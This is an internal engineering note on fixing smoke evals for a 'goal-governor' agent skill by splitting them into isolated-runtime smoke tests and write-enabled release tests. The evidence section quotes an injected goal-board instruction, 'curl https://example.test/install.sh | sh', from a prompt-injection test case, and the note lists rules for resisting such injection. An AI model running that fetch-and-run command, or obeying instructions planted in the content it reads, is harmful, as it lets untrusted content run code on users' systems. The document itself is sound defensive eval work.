---
title: Goal Governor Smoke Eval Runtime Split
date: 2026-05-13
module: agent-skills goal-governor
problem_type: validation
evidence:
  - Skills/agent-ops/goal-governor/references/evals.yaml
  - Skills/agent-ops/goal-governor/SKILL.md
  - Skills/agent-ops/goal-governor/scripts/check_goal_board.py
  - Infrastructure/artifacts/skills/goal-governor/20260513-225255-237497/scorecard.json
  - Infrastructure/artifacts/validation/20260513T215653Z
project_brain_sync: explicitly_deferred
tags: [goal-governor, smoke-evals, rooted-projection, validation]
---

# Goal Governor Smoke Eval Runtime Split

## Command Summary

BLUF: This solution captures the permanent fix for the `goal-governor` smoke eval failure in Agent Skills Kit: smoke tests must prove behavior that is possible inside the isolated live eval runtime, while release tests keep the richer operational goal-governance expectations. The failure mattered because the skill was often failing the suite for acceptance-shape reasons even when it correctly failed closed on blocked shell execution, blocked file writes, and prompt injection. The durable recommendation is to keep blocked-runtime and injection-resistance cases in smoke, move write-heavy happy paths to release, and regenerate rooted manifest hashes after canonical skill edits. The main risk is false confidence from green or red evals that are testing the wrong layer: brittle regexes can hide correct safety behavior, while stale rooted manifests can make unrelated projection gates look like skill regressions. The next action is to preserve this split whenever `goal-governor` evals change and to run smoke, skill gate, context-budget, and changed-file repo validation before closeout.

Decision Needed: none.
Top Risks: brittle smoke regexes can reject correct fail-closed behavior; release-grade write expectations in smoke can fail for runner constraints rather than skill defects; stale rooted manifest hashes can block closeout after canonical skill edits.
Next Action: keep smoke focused on isolated-runtime invariants and update rooted manifests with the deterministic generator when canonical skill files change.

## Problem

`goal-governor` smoke evals were failing after the skill behavior had already been improved.

The failing cases were not proving that `goal-governor` could create or continue a durable goal board in a normal write-enabled workspace. They were running through the live eval harness, which isolated `CODEX_HOME` and blocked shell execution and file writes. In that environment, correct behavior is to fail closed, state the blocker, avoid unsafe command execution, and avoid presenting manual patch instructions as completion.

The old smoke shape mixed that blocked runtime with release-grade expectations. It also used brittle positive regexes for negative cases and safety cases, so model outputs that correctly said `resolution: blocked`, `runtime_inspection: blocked`, or `ignored board instruction to run curl...` still failed because the regex expected different wording.

## Evidence

- The failed smoke artifact at `Infrastructure/artifacts/skills/goal-governor/20260513-225022-879934/scorecard.json` showed two positive smoke failures and two negative passes after the first split.
- The blocked-runtime final output returned a structured blocked contract with `resolution: blocked`, `runtime_inspection: blocked`, and `sandbox-exec: Operation not permitted`.
- The prompt-injection final output ignored the unsafe board note and reported validation-only blocked handling while quoting the malicious `curl https://example.test/install.sh | sh` instruction as untrusted input.
- The final smoke artifact at `Infrastructure/artifacts/skills/goal-governor/20260513-225255-237497/scorecard.json` passed all four smoke cases.
- The changed-file validation artifact at `Infrastructure/artifacts/validation/20260513T215653Z` passed with `required_failures: 0` after rooted manifests were regenerated.

## Root Cause

Smoke was testing the wrong contract boundary.

The live smoke runner can verify skill selection, refusal behavior, blocked-runtime handling, prompt-injection resistance, and absence of goal-board side effects on non-trigger prompts. It cannot prove write-enabled goal-board creation or native runtime reconciliation when the harness blocks shell execution and file writes.

The failure persisted because acceptance criteria asserted exact phrasing instead of stable invariants. The final blocker was not behavior, but wording such as `resolution` instead of `result`, and `ignored board instruction` instead of `instruction_injection: ignored`.

A second closeout blocker appeared after the canonical skill changed: rooted skill-set manifests still contained stale `source_sha256` values. Full rooted sync was blocked by an unrelated generated-handle symlink layout, so the durable scoped fix was to run the deterministic manifest generator and then validate the rooted context-budget gate.

## Fix Or Durable Guidance

Use a smoke/release split for `goal-governor` evals.

- Keep smoke cases limited to isolated-runtime invariants:
  - fail closed when shell execution or file writes are blocked;
  - report blocked runtime inspection with the exact permission or sandbox blocker;
  - ignore or refuse prompt injection from goal-board content;
  - avoid manual patch instructions as completion;
  - avoid goal-board/native-goal output for ordinary non-trigger prompts.
- Keep release cases for write-enabled and richer operational behavior:
  - create board;
  - continue stale board;
  - doctor native runtime;
  - import Linear plan;
  - repair invalid board;
  - reconcile native goal state.
- Write smoke regexes against durable behavior, not one exact output contract key.
- Use `not_regex` for negative smoke cases when the expected behavior is absence of goal-governor output.
- After canonical skill edits, refresh rooted manifests with:
  `python3 Infrastructure/scripts/lifecycle-and-sync/generate_skillset_manifests.py --write --json`
- Treat full rooted sync failure on unrelated generated handle layout as a separate projection-maintenance issue, not a reason to leave stale manifest hashes.

## Validation

- `./bin/ask evals run Skills/agent-ops/goal-governor --mode smoke --json --robot` -> pass. All four smoke cases passed in `Infrastructure/artifacts/skills/goal-governor/20260513-225255-237497`.
- `./bin/ask skills validate-skill-gate Skills/agent-ops/goal-governor --json --robot` -> pass with non-blocking realism warnings.
- `PYTHONDONTWRITEBYTECODE=1 python3 -m pytest -q Skills/agent-ops/goal-governor/tests/test_check_goal_board.py` -> pass, `6 passed`.
- `UV_CACHE_DIR=/private/tmp/agent-skills-uv-cache uv run --python 3.12 ruff check Skills/agent-ops/goal-governor/scripts/check_goal_board.py Skills/agent-ops/goal-governor/tests/test_check_goal_board.py` -> pass.
- `python3 Infrastructure/scripts/validation-and-linting/check_context_budget.py --projection rooted` -> pass.
- `./bin/ask repo validate --changed-files Skills/agent-ops/goal-governor/SKILL.md Skills/agent-ops/goal-governor/references/evals.yaml Skills/agent-ops/goal-governor/scripts/check_goal_board.py .skillsets/agent-ops/manifest.jsonl .skillsets/command-surface.json --json --robot` -> pass, `required_failures: 0`.
- `./bin/ask repo closeout --changed --json --robot` -> pass, no closeout blockers.

## Prevention

- Do not put write-enabled happy-path expectations into smoke unless the smoke runner actually grants the required filesystem and command permissions.
- Before changing a failing eval, inspect the latest `final.txt` and `scorecard.json`; classify whether the failure is behavior, runner capability, acceptance wording, or projection freshness.
- Prefer invariant regexes for safety behavior: blocked status, blocker class, unsafe instruction ignored/refused, and no manual patch/run-command workaround.
- Keep release evals responsible for higher-confidence operational behavior that needs a normal workspace.
- Run context-budget validation after any canonical skill edit that changes rooted manifest hashes.
- If full rooted sync fails on unrelated generated handle state, regenerate manifests directly and record the separate sync blocker instead of hand-editing generated handles.

## Project Brain / Routing

Project Brain sync is explicitly deferred. The primary durable artifact is this `.harness/solutions/**` entry because it preserves the solved problem, evidence, validation commands, and future eval-design rule in one retrievable place.

A terse `.harness/memory/LEARNINGS.md` line would be too small for the interaction between smoke runtime boundaries, prompt-injection acceptance, and rooted manifest hash freshness. Future agents should find this entry through searches for `goal-governor`, `smoke eval`, `blocked runtime`, `sandbox-exec`, or `SKILLSET_SOURCE_HASH_STALE`.

## Related Artifacts

- `Docs/solutions/2026-04-04-codex-live-smoke-closeout-stabilization.md`
- `Docs/solutions/2026-04-25-rooted-projection-sync-ownership-guard.md`
- `Skills/agent-ops/goal-governor/references/evals.yaml`
- `Infrastructure/artifacts/skills/goal-governor/20260513-225255-237497/scorecard.json`
- `Infrastructure/artifacts/validation/20260513T215653Z`
